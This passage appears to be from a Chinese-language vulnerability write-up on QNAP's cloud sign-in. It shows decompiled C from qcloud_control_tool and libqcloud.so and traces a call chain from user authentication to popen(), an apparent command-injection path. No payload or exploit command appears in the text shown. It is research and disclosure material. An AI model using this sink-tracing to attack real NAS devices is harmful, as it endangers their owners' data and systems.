class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,in_stack_ffffffffffffffc8);</span><br><span class="line"> <span class="keyword">if</span> (*(<span class="type">long</span> *)(in_stack_ffffffffffffffc8 + <span class="number">0x28</span>) != <span class="number">0</span>) </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我比较感兴趣的是<code>login.singIn()</code>函数,看上去是通过云服务进行认证, 通过运行<code>/usr/bin/qcloud_control_tool signin &#39;user&#39; &#39;password&#39;</code>验证登录. 如果你想要知道web端的代码逻辑, 感兴趣的师傅可以自行去看, 不是我不想放出来是真的太乱了并且我也没找到好的办法去显示出来.</p>
</blockquote>
<blockquote>
<p>所以我们来看C吧, 这个漏洞的调用流程如下.</p>
</blockquote>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">libqcloud.so</span><br><span class="line"></span><br><span class="line">qnap_id_auth_user()</span><br><span class="line">      |</span><br><span class="line">qnap_id_get_signin_token_cache()</span><br><span class="line">      |</span><br><span class="line">qnap_id_get_signin_token_cache_section_name()</span><br><span class="line">      |</span><br><span class="line">util_get_md5_digest()</span><br><span class="line">      |</span><br><span class="line">util_system_cmd()</span><br><span class="line">      |</span><br><span class="line">    popen()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>先看<code>qcloud_control_tool</code>程序</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">FUN_00402690</span><span class="params">(<span class="type">int</span> param_1,undefined8 *param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  undefined8 uVar3;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (param_1 &lt; <span class="number">2</span>) &#123;</span><br><span class="line">LAB_00402a6c:</span><br><span class="line">    FUN_004044bc(*param_2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = (<span class="type">char</span> *)param_2[<span class="number">1</span>];</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;report_uninit_device_info&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">3</span>)) &#123;</span><br><span class="line">    uVar2 = FUN_00402d6c(param_2[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> uVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;signin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">4</span>)) &#123;</span><br><span class="line">    uVar2 = FUN_00402dd0(param_2[<span class="number">2</span>],param_2[<span class="number">3</span>]); <span class="comment">//[1]</span></span><br><span class="line">    <span class="keyword">return</span> uVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;available&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">3</span>)) &#123;</span><br><span class="line">    uVar2 = FUN_00402ec8(param_2[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> uVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 != <span class="number">0</span>) || (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;publish&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00402f70(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;enable_ddns&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">3</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403358(param_2[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;set_ddns_config&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 != <span class="number">2</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (param_1 == <span class="number">3</span>) &#123;</span><br><span class="line">        uVar2 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uVar2 = param_2[<span class="number">3</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      uVar2 = FUN_004034c0(param_2[<span class="number">2</span>],uVar2);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;get_ddns_config&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      uVar2 = FUN_004034f4();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;verify_device&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">3</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403934(param_2[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;get_device_info&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403a48();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;update_device_info&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403c80();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;check_device_info&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403da8();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;unbind&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_004039b8();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;get_wan_ip&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403e08();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;get_geoinfo&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">2</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403ee0();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;change_name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">3</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00403f78(param_2[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;change_region&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">3</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00404000(param_2[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;switch_to_centralized_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 != <span class="number">2</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (param_1 == <span class="number">3</span>) &#123;</span><br><span class="line">        uVar2 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uVar2 = param_2[<span class="number">3</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      uVar2 = FUN_004040d8(param_2[<span class="number">2</span>],uVar2);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,<span class="string">&quot;get_user_access_token&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (param_1 == <span class="number">3</span>)) &#123;</span><br><span class="line">      uVar2 = FUN_00404414(param_2[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LAB_00402a6c;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (param_1 == <span class="number">3</span>) &#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = param_2[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> (param_1 != <span class="number">4</span>) &#123;</span><br><span class="line">      uVar3 = param_2[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">goto</span> LAB_0040277c;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar3 = <span class="number">0</span>;</span><br><span class="line">LAB_0040277c:</span><br><span class="line">  uVar2 = FUN_00403204(param_2[<span class="number">2</span>],uVar2,uVar3);</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>非常简洁的代码进入到[1]处, 并传入我们的user和pwd.</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">uint <span class="title">FUN_00402dd0</span><span class="params">(undefined8 param_1,undefined8 param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  undefined8 Config_Data;</span><br><span class="line">  undefined8 local_fe0;</span><br><span class="line">  undefined8 uStack_fd8;</span><br><span class="line">  undefined auStack_fd0 [<span class="number">1096</span>];</span><br><span class="line">  undefined auStack_b88 [<span class="number">255</span>];</span><br><span class="line">  <span class="type">char</span> local_a89;</span><br><span class="line">  </span><br><span class="line">  local_fe0 = <span class="number">0</span>;</span><br><span class="line">  uStack_fd8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_fd0,<span class="number">0</span>,<span class="number">0x445</span>);</span><br><span class="line">  <span class="built_in">memset</span>(auStack_b88,<span class="number">0</span>,<span class="number">0xb84</span>);</span><br><span class="line">  Config_Data = <span class="built_in">qcloud_init_ctx</span>(auStack_fd0);</span><br><span class="line">  <span class="built_in">qcloud_get_device_info</span>(Config_Data,auStack_b88);</span><br><span class="line">  <span class="keyword">if</span> (local_a89 == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">qid_sys_get_bind_mode</span>(&amp;local_fe0,<span class="number">0x10</span>);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)&amp;local_fe0,<span class="string">&quot;centralized&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      uVar2 = <span class="built_in">qcloud_organization_auth_user</span>(Config_Data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uVar2 = <span class="built_in">qnap_id_auth_user</span>(Config_Data,param_1,param_2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="built_in">qnap_id_signin</span>(Config_Data,param_1,param_2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ret: %d\n&quot;</span>,(ulong)uVar2);</span><br><span class="line">  <span class="built_in">qcloud_cleanup_ctx</span>(Config_Data);</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>这里有一点判断但是无伤大雅后面我会解释这里的判断, 进入到我们的<code>qnap_id_auth_user()</code>函数在<code>libqcloud.so</code>库中.</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qnap_id_auth_user</span><span class="params">(<span class="type">long</span> param_1,<span class="type">long</span> Username,<span class="type">char</span> *Password_or_Token)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">long</span> lVar3;</span><br><span class="line">  undefined8 uVar4;</span><br><span class="line">  undefined *puVar5;</span><br><span class="line">  <span class="type">int</span> local_1b34;</span><br><span class="line">  undefined8 local_1b30;</span><br><span class="line">  <span class="type">long</span> local_1b28;</span><br><span class="line">  undefined8 local_1b20;</span><br><span class="line">  undefined8 uStack_1b18;</span><br><span class="line">  undefined auStack_1b10 [<span class="number">1016</span>];</span><br><span class="line">  undefined8 local_1718;</span><br><span class="line">  undefined8 uStack_1710;</span><br><span class="line">  undefined auStack_1708 [<span class="number">1016</span>];</span><br><span class="line">  <span class="type">char</span> local_1310 [<span class="number">520</span>];</span><br><span class="line">  <span class="type">char</span> local_1108 [<span class="number">4360</span>];</span><br><span class="line">  </span><br><span class="line">  local_1b20 = <span class="number">0</span>;</span><br><span class="line">  uStack_1b18 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_1b10,<span class="number">0</span>,<span class="number">0x3f1</span>);</span><br><span class="line">  local_1718 = <span class="number">0</span>;</span><br><span class="line">  uStack_1710 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_1708,<span class="number">0</span>,<span class="number">0x3f1</span>);</span><br><span class="line">  local_1b30 = <span class="number">0</span>;</span><br><span class="line">  local_1b28 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(local_1310,<span class="number">0</span>,<span class="number">0x130c</span>);</span><br><span class="line">  <span class="keyword">if</span> ((param_1 == <span class="number">0</span> || Username == <span class="number">0</span>) || (Password_or_Token == (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">    <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;qid/qcloud_auth.c&quot;</span>,<span class="number">0x20c</span>,<span class="string">&quot;qnap_id_auth_user&quot;</span>,<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-0x3c7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">util_is_qcloud_oauth_token_format</span>(Password_or_Token);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">qnap_id_get_signin_token_cache</span></span><br><span class="line">                      (param_1,param_1 + <span class="number">0x202</span>,<span class="string">&quot;password&quot;</span>,Username,Password_or_Token,local_1310); <span class="comment">//[1]</span></span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">qnap_id_signout_token</span>(param_1,local_1310,local_1310);</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">qnap_id_signin_token</span></span><br><span class="line">                      (param_1,param_1,param_1 + <span class="number">0x202</span>,<span class="string">&quot;password&quot;</span>,Username,Password_or_Token,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">                       local_1310);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) <span class="keyword">goto</span> LAB_001306ac;</span><br><span class="line">    <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;qid/qcloud_auth.c&quot;</span>,<span class="number">0x21e</span>,<span class="string">&quot;qnap_id_auth_user&quot;</span>,<span class="string">&quot;login failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(local_1310,Password_or_Token,<span class="number">0x100</span>);</span><br><span class="line">LAB_001306ac:</span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_1b20,<span class="number">0x400</span>,<span class="string">&quot;%s/v1.2/device/%s&quot;</span>,param_1 + <span class="number">0x989</span>,param_1 + <span class="number">0x1432</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_1718,<span class="number">0x400</span>,<span class="string">&quot;Authorization: Bearer %s&quot;</span>,local_1310);</span><br><span class="line">    iVar1 = <span class="built_in">qid_httpc_request_ex</span>(param_1,<span class="number">0</span>,<span class="number">0</span>,&amp;local_1b20,&amp;local_1718,<span class="number">0</span>,&amp;local_1b30,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> &lt; iVar1) &#123;</span><br><span class="line">      lVar3 = <span class="built_in">json_tokener_parse_verbose</span>(local_1b30,&amp;local_1b34);</span><br><span class="line">      <span class="keyword">if</span> ((lVar3 == <span class="number">0</span>) || (local_1b34 != <span class="number">0</span>)) &#123;</span><br><span class="line">        iVar1 = <span class="number">-0x3e3</span>;</span><br><span class="line">        uVar4 = <span class="built_in">json_tokener_error_desc</span>(local_1b34);</span><br><span class="line">        <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;qid/qcloud_auth.c&quot;</span>,<span class="number">0x233</span>,<span class="string">&quot;qnap_id_auth_user&quot;</span>,<span class="string">&quot;json-c_parse: %s&quot;</span>,</span><br><span class="line">                 uVar4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        iVar2 = <span class="built_in">json_object_object_get_ex</span>(lVar3,<span class="string">&quot;code&quot;</span>,&amp;local_1b28);</span><br><span class="line">        <span class="keyword">if</span> ((iVar2 != <span class="number">0</span>) &amp;&amp; (local_1b28 != <span class="number">0</span>)) &#123;</span><br><span class="line">          <span class="built_in">json_object_get_string</span>();</span><br><span class="line">          iVar1 = <span class="built_in">qcloud_get_status_code</span>();</span><br><span class="line">          <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) <span class="keyword">goto</span> LAB_00130774;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (local_1310[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">          <span class="built_in">qid_sys_set_centralized_mode_access_token</span>(Username,local_1310);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (local_1108[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">          <span class="built_in">qid_sys_set_centralized_mode_refresh_token</span>(Username,local_1108);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00130774;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  lVar3 = <span class="number">0</span>;</span><br><span class="line">LAB_00130774:</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span> || lVar3 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lVar3 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> iVar1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar2 = <span class="built_in">json_object_object_get_ex</span>(lVar3,<span class="string">&quot;stacktrace&quot;</span>,&amp;local_1b28);</span><br><span class="line">    <span class="keyword">if</span> ((iVar2 != <span class="number">0</span>) &amp;&amp; (local_1b28 != <span class="number">0</span>)) &#123;</span><br><span class="line">      uVar4 = <span class="built_in">json_object_get_string</span>();</span><br><span class="line">      <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;qid/qcloud_auth.c&quot;</span>,<span class="number">0x252</span>,<span class="string">&quot;qnap_id_auth_user&quot;</span>,<span class="string">&quot;stacktrace: %s&quot;</span>,uVar4)</span><br><span class="line">      ;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar2 = <span class="built_in">json_object_object_get_ex</span>(lVar3,<span class="string">&quot;message&quot;</span>,&amp;local_1b28);</span><br><span class="line">    <span 